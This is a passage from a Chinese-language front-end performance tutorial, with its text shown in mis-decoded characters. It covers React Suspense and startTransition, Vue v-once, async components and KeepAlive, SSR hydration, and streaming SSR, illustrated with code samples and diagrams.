class="hljs-keyword">function</span> <span class="hljs-title function_">ProfilePage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ProfileSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ProfileDetails</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 3. startTransition ä¿æŒUIå“åº”</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchBox</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [keywords, setKeywords] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [results, setResults] = <span class="hljs-title function_">useState</span>([]);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setKeywords</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// ç«‹å³æ›´æ–°è¾“å…¥æ¡†</span><br>    <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> &#123;      <span class="hljs-comment">// å»¶è¿Ÿè®¡ç®—æœç´¢ç»“æœ</span><br>      <span class="hljs-title function_">setResults</span>(<span class="hljs-title function_">computeResults</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>));<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¹¶å‘ä¼˜åŠ¿ï¼š</p><table><thead><tr><th align="left">ä¼ ç»Ÿæ¨¡å¼</th><th align="left">å¹¶å‘æ¨¡å¼</th></tr></thead><tbody><tr><td align="left">æ¸²æŸ“é˜»å¡ç”¨æˆ·è¾“å…¥</td><td align="left">é«˜ä¼˜å…ˆçº§æ“ä½œï¼ˆå¦‚è¾“å…¥ï¼‰å¯ä¸­æ–­æ¸²æŸ“</td></tr><tr><td align="left">æ•°æ®åŠ è½½å®Œæˆå‰æ˜¾ç¤ºç©ºç™½</td><td align="left">Suspenseæä¾›åŠ è½½æ€å ä½</td></tr><tr><td align="left">ç»„ä»¶æ ‘å…¨é‡æ›´æ–°</td><td align="left">éƒ¨åˆ†å­æ ‘ç‹¬ç«‹æ›´æ–°</td></tr></tbody></table><p><strong>ç»¼åˆä¼˜åŒ–æ•ˆæœå¯¹æ¯”</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼˜åŒ–å‰ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">ProductPage</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [products] = <span class="hljs-title function_">fetchAllProducts</span>(); <span class="hljs-comment">// åŒæ­¥é˜»å¡</span><br>  <br>  <span class="hljs-keyword">return</span> products.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductCard</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;p&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;computeDetails&#125;</span> // <span class="hljs-attr">å¤æ‚è®¡ç®—</span></span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  ))<br>&#125;<br><br><span class="hljs-comment">// ä¼˜åŒ–åå®ç°</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">OptimizedProductPage</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-comment">// 1. æ•°æ®å¼‚æ­¥åŠ è½½</span><br>  <span class="hljs-keyword">const</span> [products] = <span class="hljs-title function_">use</span>(fetchProductsResource); <span class="hljs-comment">// Suspenseå…¼å®¹</span><br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Search</span> /&gt;</span> &#123;/* åŒ…å«startTransitionçš„è¾“å…¥æ¡† */&#125;</span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">GridSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;product-grid&quot;</span>&gt;</span></span><br><span class="language-xml">          &#123;products.map(p =&gt; (</span><br><span class="language-xml">            // 2. ç»„ä»¶è®°å¿†åŒ–</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">MemoizedProductCard</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;p.id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;p&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              // <span class="hljs-attr">3.</span> <span class="hljs-attr">äº‹ä»¶å›è°ƒè®°å¿†åŒ–</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;useCallback(()</span> =&gt;</span> </span><br><span class="language-xml">                computeDetails(p.id), [p.id]</span><br><span class="language-xml">              )&#125;</span><br><span class="language-xml">            /&gt;</span><br><span class="language-xml">          ))&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 4. å¼‚æ­¥åŠ è½½æ¨èæ¨¡å— */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">RecommendPlaceholder</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">LazyRecommendSection</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Vueï¼šv-onceã€å¼‚æ­¥ç»„ä»¶ã€KeepAlive"><a href="#Vueï¼šv-onceã€å¼‚æ­¥ç»„ä»¶ã€KeepAlive" class="headerlink" title="Vueï¼šv-onceã€å¼‚æ­¥ç»„ä»¶ã€KeepAlive"></a>Vueï¼šv-onceã€å¼‚æ­¥ç»„ä»¶ã€KeepAlive</h3><p><strong>v-onceï¼šé™æ€å†…å®¹ä¼˜åŒ–</strong></p><p>æ ¸å¿ƒä½œç”¨ï¼šæ ‡è®°å…ƒç´ &#x2F;ç»„ä»¶åªæ¸²æŸ“ä¸€æ¬¡ï¼Œè·³è¿‡åç»­æ›´æ–°</p><p>å®ç°åŸç†ï¼š</p><ul><li>ç¼–è¯‘é˜¶æ®µè¯†åˆ«é™æ€èŠ‚ç‚¹æ ‘</li><li>åˆ›å»ºDOMåè§£é™¤å“åº”å¼ç»‘å®š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;template&gt;<br>  &lt;!-- é™æ€å¤´éƒ¨ --&gt;<br>  &lt;header v-once&gt;<br>    &lt;h1&gt;&#123;&#123; title &#125;&#125;&lt;/h1&gt; &lt;!-- ä»…é¦–æ¬¡æ¸²æŸ“ --&gt;<br>    &lt;nav&gt;...&lt;/nav&gt;<br>  &lt;/header&gt;<br>  <br>  &lt;!-- åŠ¨æ€å†…å®¹ --&gt;<br>  &lt;main&gt;<br>    &#123;&#123; dynamicContent &#125;&#125; &lt;!-- æ¯æ¬¡æ›´æ–° --&gt;<br>  &lt;/main&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  data() &#123;<br>    return &#123;<br>      title: &#x27;æ°¸ä¹…æ ‡é¢˜&#x27;, // åˆå§‹å€¼é”å®š<br>      dynamicContent: &#x27;å˜åŒ–å†…å®¹&#x27;<br>    &#125;<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>å¼‚æ­¥ç»„ä»¶ï¼šæŒ‰éœ€åŠ è½½</strong></p><p>æ ¸å¿ƒæ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. åŸºç¡€å¼‚æ­¥ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncPopup</span> = <span class="hljs-title function_">defineAsyncComponent</span>(<span class="hljs-function">() =&gt;</span> <br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Popup.vue&#x27;</span>)<br>)<br><br><span class="hljs-comment">// 2. é«˜çº§é…ç½®ï¼ˆåŠ è½½çŠ¶æ€/è¶…æ—¶/é”™è¯¯å¤„ç†ï¼‰</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncCart</span> = <span class="hljs-title function_">defineAsyncComponent</span>(&#123;<br>  <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ShoppingCart.vue&#x27;</span>),<br>  <span class="hljs-attr">loadingComponent</span>: <span class="hljs-title class_">LoadingSpinner</span>,<br>  <span class="hljs-attr">errorComponent</span>: <span class="hljs-title class_">ErrorDisplay</span>,<br>  <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span>,  <span class="hljs-comment">// å»¶è¿Ÿæ˜¾ç¤ºloading</span><br>  <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span> <span class="hljs-comment">// è¶…æ—¶æ—¶é—´</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>è·¯ç”±çº§åˆ†å‰²ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Vue Routeré…ç½®</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;dashboard&quot; */</span> <span class="hljs-string">&#x27;./Dashboard.vue&#x27;</span>),<br>    <span class="hljs-attr">children</span>: [<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;analytics&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Analytics.vue&#x27;</span>) <span class="hljs-comment">// åµŒå¥—å¼‚æ­¥</span><br>      &#125;<br>    ]<br>  &#125;<br>]<br></code></pre></td></tr></table></figure><p><strong>KeepAliveï¼šç»„ä»¶ç¼“å­˜</strong></p><p>æ ¸å¿ƒèƒ½åŠ›ï¼šç¼“å­˜éæ´»åŠ¨ç»„ä»¶å®ä¾‹ï¼Œé¿å…é‡å¤æ¸²æŸ“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Vue">&lt;template&gt;<br>  &lt;component :is=&quot;currentTab&quot;&gt;<br>    &lt;!-- åŠ¨æ€åˆ‡æ¢ç»„ä»¶ --&gt;<br>  &lt;/component&gt;<br>  <br>  &lt;KeepAlive <br>    :include=&quot;[&#x27;UserProfile&#x27;, &#x27;Settings&#x27;]&quot; <br>    :max=&quot;5&quot;<br>  &gt;<br>    &lt;component :is=&quot;activeComponent&quot; /&gt;<br>  &lt;/KeepAlive&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure><p>ç”Ÿå‘½å‘¨æœŸæ§åˆ¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">activated</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// ç»„ä»¶è¢«æ¿€æ´»æ—¶è°ƒç”¨ï¼ˆä»ç¼“å­˜æ¢å¤ï¼‰</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fetchData</span>()<br>  &#125;,<br>  <span class="hljs-title function_">deactivated</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// ç»„ä»¶è¢«åœç”¨æ—¶è°ƒç”¨ï¼ˆè¿›å…¥ç¼“å­˜ï¼‰</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">clearTimers</span>()<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»¼åˆä¼˜åŒ–ç¤ºä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Vue">&lt;template&gt;<br>  &lt;!-- é™æ€æ¡†æ¶ --&gt;<br>  &lt;div v-once class=&quot;app-frame&quot;&gt;<br>    &lt;AppHeader /&gt;<br>    &lt;AppNav /&gt;<br>  &lt;/div&gt;<br>  <br>  &lt;!-- åŠ¨æ€åŒºåŸŸ --&gt;<br>  &lt;RouterView v-slot=&quot;&#123; Component &#125;&quot;&gt;<br>    &lt;KeepAlive include=&quot;ProductList,UserProfile&quot;&gt;<br>      &lt;Suspense&gt;<br>        &lt;!-- å¼‚æ­¥ç»„ä»¶å®¹å™¨ --&gt;<br>        &lt;component :is=&quot;Component&quot; /&gt;<br>        <br>        &lt;!-- åŠ è½½çŠ¶æ€ --&gt;<br>        &lt;template #fallback&gt;<br>          &lt;LoadingIndicator /&gt;<br>        &lt;/template&gt;<br>      &lt;/Suspense&gt;<br>    &lt;/KeepAlive&gt;<br>  &lt;/RouterView&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>// å¼‚æ­¥ç»„ä»¶æ³¨å†Œ<br>const ProductList = defineAsyncComponent(() =&gt; <br>  import(&#x27;./ProductList.vue&#x27;)<br>)<br>const UserProfile = defineAsyncComponent(&#123;<br>  loader: () =&gt; import(&#x27;./UserProfile.vue&#x27;),<br>  loadingComponent: ProfileSkeleton<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µç»„åˆ</strong></p><ul><li>é™æ€å†…å®¹ï¼šv-once ç”¨äºé¡µçœ‰&#x2F;é¡µè„šç­‰ä¸å˜åŒºåŸŸ</li><li>åŠ¨æ€æ¨¡å—ï¼šdefineAsyncComponent + Suspense å®ç°æŒ‰éœ€åŠ è½½</li><li>é«˜é¢‘åˆ‡æ¢ï¼šKeepAlive ç¼“å­˜æ ‡ç­¾é¡µ&#x2F;å¼¹çª—ç­‰ç»„ä»¶</li><li>ç¼“å­˜ç®¡ç†ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»åŠ¨æ¸…é™¤ç¼“å­˜</span><br><span class="hljs-keyword">import</span> &#123; getCurrentInstance &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> instance = <span class="hljs-title function_">getCurrentInstance</span>()<br>    <br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">resetCache</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-comment">// æ¸…é™¤UserProfileç¼“å­˜</span><br>      instance.<span class="hljs-property">appContext</span>.<span class="hljs-property">config</span>.<span class="hljs-property">globalProperties</span>.<span class="hljs-property">$keepAliveStore</span><br>        .<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;UserProfile&#x27;</span>)<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸ React ä¼˜åŒ–å¯¹æ¯”</strong></p><table><thead><tr><th align="left">æŠ€æœ¯</th><th align="left">Vue</th><th align="left">React</th><th align="left">ç­‰æ•ˆæ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">é™æ€ä¼˜åŒ–</td><td align="left">v-once</td><td align="left">React.memo</td><td align="left">é¿å…é‡æ¸²æŸ“</td></tr><tr><td align="left">æŒ‰éœ€åŠ è½½</td><td align="left">defineAsyncComponent</td><td align="left">React.lazy</td><td align="left">ä»£ç åˆ†å‰²</td></tr><tr><td align="left">ç»„ä»¶ç¼“å­˜</td><td align="left">KeepAlive</td><td align="left">æ— å†…ç½®ç­‰æ•ˆ</td><td align="left">éœ€æ‰‹åŠ¨å®ç°</td></tr><tr><td align="left">åŠ è½½çŠ¶æ€</td><td align="left">Suspense</td><td align="left">Suspense</td><td align="left">å ä½ç¬¦æ–¹æ¡ˆ</td></tr></tbody></table><h3 id="Angularï¼šChange-Detectionç­–ç•¥ã€Pure-Pipes"><a href="#Angularï¼šChange-Detectionç­–ç•¥ã€Pure-Pipes" class="headerlink" title="Angularï¼šChange Detectionç­–ç•¥ã€Pure Pipes"></a>Angularï¼šChange Detectionç­–ç•¥ã€Pure Pipes</h3><h2 id="4-2-SSR-SSGä¼˜åŒ–"><a href="#4-2-SSR-SSGä¼˜åŒ–" class="headerlink" title="4.2 SSR&#x2F;SSGä¼˜åŒ–"></a>4.2 SSR&#x2F;SSGä¼˜åŒ–</h2><h3 id="æ°´åˆï¼ˆHydrationï¼‰æ€§èƒ½ç“¶é¢ˆåˆ†æ"><a href="#æ°´åˆï¼ˆHydrationï¼‰æ€§èƒ½ç“¶é¢ˆåˆ†æ" class="headerlink" title="æ°´åˆï¼ˆHydrationï¼‰æ€§èƒ½ç“¶é¢ˆåˆ†æ"></a>æ°´åˆï¼ˆHydrationï¼‰æ€§èƒ½ç“¶é¢ˆåˆ†æ</h3><p><strong>æ°´åˆæœºåˆ¶æ ¸å¿ƒåŸç†</strong></p><pre class="mermaid">sequenceDiagram  participant Client  participant DOM  participant JavaScript    Note over Client, JavaScript: 1. åˆå§‹åŠ è½½  Client->>DOM: æ¥æ”¶é™æ€HTMLï¼ˆSSRè¾“å‡ºï¼‰  DOM->>Client: å¿«é€Ÿæ˜¾ç¤ºéäº¤äº’ç•Œé¢    Note over Client, JavaScript: 2. æ°´åˆå¯åŠ¨  JavaScript->>DOM: æ‰«æDOMèŠ‚ç‚¹  DOM->>JavaScript: è¿”å›èŠ‚ç‚¹ä¿¡æ¯    Note over Client, JavaScript: 3. é‡å»ºå…³è”  JavaScript->>JavaScript: é‡æ–°åˆ›å»ºç»„ä»¶å®ä¾‹  JavaScript->>DOM: ç»‘å®šäº‹ä»¶ç›‘å¬å™¨  JavaScript->>DOM: å…³è”å†…éƒ¨çŠ¶æ€    Note over Client, JavaScript: 4. å®Œæˆè½¬æ¢  JavaScript->>Client: é™æ€é¡µé¢â†’å¯äº¤äº’åº”ç”¨</pre><p>æŠ€æœ¯æœ¬è´¨ï¼š</p><ul><li>å°†æœåŠ¡å™¨æ¸²æŸ“çš„é™æ€HTMLä¸å®¢æˆ·ç«¯JavaScripté€»è¾‘å…³è”</li><li>é‡å»ºç»„ä»¶æ ‘çŠ¶æ€&#x2F;äº‹ä»¶ç»‘å®šï¼Œä½¿é¡µé¢å¯äº¤äº’</li><li>å…³é”®æ­¥éª¤ï¼šDOMèŠ‚ç‚¹éå† â†’ VDOMåŒ¹é… â†’ äº‹ä»¶ç»‘å®š â†’ çŠ¶æ€æ³¨å…¥</li></ul><p><strong>æ°´åˆä¼˜åŒ–è·¯çº¿å›¾</strong></p><pre class="mermaid">flowchart LR  A[è¯†åˆ«ç“¶é¢ˆ] --> B{é—®é¢˜ç±»å‹}  B --> C[DOMèŠ‚ç‚¹è¿‡å¤š] --> C1[ä»£ç åˆ†å‰²/æ‡’åŠ è½½]  B --> D[äº‹ä»¶ç»‘å®šæ…¢] --> D1[äº‹ä»¶å§”æ‰˜/å»¶è¿Ÿç»‘å®š]  B --> E[æ•°æ®ä¸åŒ¹é…] --> E1[ç»Ÿä¸€æ¸²æŸ“é€»è¾‘]  B --> F[è¯·æ±‚é˜»å¡] --> F1[å¼‚æ­¥æ•°æ®è·å–]  B --> G[åº“ä¸å…¼å®¹] --> G1[åŠ¨æ€å¯¼å…¥]  B --> H[å†…å­˜æ³„æ¼] --> H1[èµ„æºæ¸…ç†]    C1 & D1 & E1 & F1 & G1 & H1 --> I[æ°´åˆå®Œæˆæ—¶é—´<200ms]</pre><p><strong>å…³é”®ç»“è®º</strong></p><p>æ°´åˆç“¶é¢ˆçš„æœ¬è´¨æ˜¯ä¸»çº¿ç¨‹è¿‡è½½ï¼Œä¼˜åŒ–æ ¸å¿ƒæ˜¯å‡å°‘ä¸å¯ä¸­æ–­çš„åŒæ­¥æ“ä½œã€‚é€šè¿‡èŠ‚ç‚¹ç²¾ç®€ã€å¼‚æ­¥è§£è€¦å’Œæ¸è¿›åŠ è½½ï¼Œå¯æå‡äº¤äº’å°±ç»ªé€Ÿåº¦ 50-300%ã€‚</p><h3 id="æµå¼æ¸²æŸ“ï¼ˆStreaming-SSRï¼‰"><a href="#æµå¼æ¸²æŸ“ï¼ˆStreaming-SSRï¼‰" class="headerlink" title="æµå¼æ¸²æŸ“ï¼ˆStreaming SSRï¼‰"></a>æµå¼æ¸²æŸ“ï¼ˆStreaming SSRï¼‰</h3><p><strong>ä¼ ç»ŸSSR vs æµå¼SSRæ¶æ„å¯¹æ¯”</strong></p><pre class="mermaid">graph LR  A[ä¼ ç»ŸSSR] --> B[è¯·æ±‚]  B --> C[æœåŠ¡å™¨è·å–æ•°æ®]  C --> D[æ¸²æŸ“å®Œæ•´HTML]  D --> E[å‘é€HTML]  E --> F[å®¢æˆ·ç«¯æ˜¾ç¤º]    G[æµå¼SSR] --> H[è¯·æ±‚]  H --> I[ç«‹å³å‘é€HTMLæ¡†æ¶]  I --> J[æœåŠ¡å™¨å¹¶è¡Œè·å–æ•°æ®]  J --> K[æµå¼ä¼ è¾“å†…å®¹å—]  K --> L[å®¢æˆ·ç«¯æ¸è¿›æ¸²æŸ“]</pre><p>æ ¸å¿ƒå·®å¼‚ï¼š</p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">ä¼ ç»ŸSSR</th><th align="left">æµå¼SSR</th></tr></thead><tbody><tr><td align="left">å“åº”æ–¹å¼</td><td align="left">å…¨æœ‰æˆ–å…¨æ— </td><td align="left">åˆ†å—æ¸è¿›ä¼ è¾“</td></tr><tr><td align="left">TTFB</td><td align="left">é«˜ï¼ˆç­‰æ‰€æœ‰æ•°æ®ï¼‰</td><td align="left">æä½ï¼ˆç«‹å³å‘é€æ¡†æ¶ï¼‰</td></tr><tr><td align="left">LCP</td><td align="left">ä¾èµ–å®Œæ•´HTML</td><td align="left">ä¼˜å…ˆæ¸²æŸ“å…³é”®å†…å®¹</td></tr><tr><td align="left">èµ„æºåŠ è½½</td><td align="left">æœ€åé˜¶æ®µåŠ è½½</td><td align="left">æ—©æœŸå¹¶è¡ŒåŠ è½½</td></tr></tbody></table><p><strong>æŠ€æœ¯å®ç°åŸç†</strong></p><pre class="mermaid">sequenceDiagram  participant Client  participant Server  participant DB    Client->>Server: è¯·æ±‚é¡µé¢  Server->>Client: ç«‹å³å‘é€HTMLæ¡†æ¶+å ä½ç¬¦    par å¹¶è¡Œå¤„ç†    Server->>DB: æŸ¥è¯¢å…³é”®æ•°æ®    Server->>DB: æŸ¥è¯¢æ¬¡è¦æ•°æ®  end    Server->>Client: å‘é€å…³é”®å†…å®¹å—  Client->>Client: æ¸²æŸ“å…³é”®å†…å®¹    Server->>Client: å‘é€æ¬¡è¦å†…å®¹å—  Client->>Client: æ¸²æŸ“æ¬¡è¦å†…å®¹    Server->>Client: å‘é€ç»“æŸæ ‡è®°  Client->>Client: å®Œæˆæ¸²æŸ“</pre><p>å…³é”®æ­¥éª¤ï¼š</p><p>(1) å“åº”å¤´è®¾ç½®ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br></code></pre></td></tr></table></figure><p>(2) å†…å®¹åˆ†å—ä¼ è¾“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- åˆå§‹æ¡†æ¶ --&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>  &lt;head&gt;...&lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;div 